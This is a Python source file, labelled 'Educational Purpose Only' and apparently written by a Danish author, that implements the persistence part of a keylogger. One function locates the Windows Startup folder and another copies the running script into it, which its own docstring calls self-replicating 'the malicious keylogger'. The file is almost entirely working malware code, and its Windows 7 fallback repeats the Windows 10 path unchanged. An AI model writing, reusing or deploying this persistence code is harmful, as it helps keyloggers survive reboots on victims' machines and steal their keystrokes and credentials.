
"""
  ______    _                 _   _                   _
 |  ____|  | |               | | (_)                 | |
 | |__   __| |_   _  ___ __ _| |_ _  ___  _ __   __ _| |
 |  __| / _` | | | |/ __/ _` | __| |/ _ \| '_ \ / _` | |
 | |___| (_| | |_| | (_| (_| | |_| | (_) | | | | (_| | |
 |______\__,_|\__,_|\___\__,_|\__|_|\___/|_|_|_|\__,_|_|
 |  __ \                                  / __ \      | |
 | |__) |   _ _ __ _ __   ___  ___  ___  | |  | |_ __ | |_   _
 |  ___/ | | | '__| '_ \ / _ \/ __|/ _ \ | |  | | '_ \| | | | |
 | |   | |_| | |  | |_) | (_) \__ \  __/ | |__| | | | | | |_| |
 |_|    \__,_|_|  | .__/ \___/|___/\___|  \____/|_| |_|_|\__, |
                  | |                                     __/ |
     _____        |_|   _      _ _                   ___ |___/
    |  __ \            (_)    | | |                 / _ \| || |
    | |  | | __ _ _ __  _  ___| | | ____ _  __ _ __| (_) | || |_
    | |  | |/ _` | '_ \| |/ _ \ | |/ / _` |/ _` / __\__, |__   _|
    | |__| | (_| | | | | |  __/ |   < (_| | (_| \__ \ / /   | |
    |_____/ \__,_|_| |_|_|\___|_|_|\_\__,_|\__,_|___//_/    |_|

    6th January 2024
"""

# Self-Replicate
import shutil
import sys

# Start Folder
import os

from colorama import Fore, Back, Style

# Windows Start Folder
def GetWindowsStartFolder():
    """
    🪟 Find the Windows Start Folder 🪟
    :return:
    """
    # Get into this file C:\Users\YourUsername\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    startup_folder_path = None

    try:
        # Try Windows 10 and later path
        startup_folder_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

        # Check if the path exists
        if not os.path.exists(startup_folder_path):
            raise FileNotFoundError

    except FileNotFoundError:
        try:
            # Try Windows 7 path
            startup_folder_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

            # Check if the path exists
            if not os.path.exists(startup_folder_path):
                raise FileNotFoundError

        except FileNotFoundError:
            print("Could not determine the Startup folder path for your Windows version.")

    # Now 'startup_folder_path' contains the full path to the Startup folder, or an error message is printed
    return startup_folder_path


# The Self-replication Code
def SelfReplicateThis():
    """
    🆕 Self-replication the malicious keylogger into the WindowsStartFolder 🆕
    :return:
    """
    destination = GetWindowsStartFolder()

    # Få stien til den aktuelle kørende fil
    current_script = os.path.abspath(sys.argv[0])

    try:
        # Kopier filen til den angivne destination
        shutil.copy(current_script, destination)
        print(f"Fil kopieret til: {destination}")
    except Exception as e:
        print(f"Fejl ved kopiering af fil: {e}")
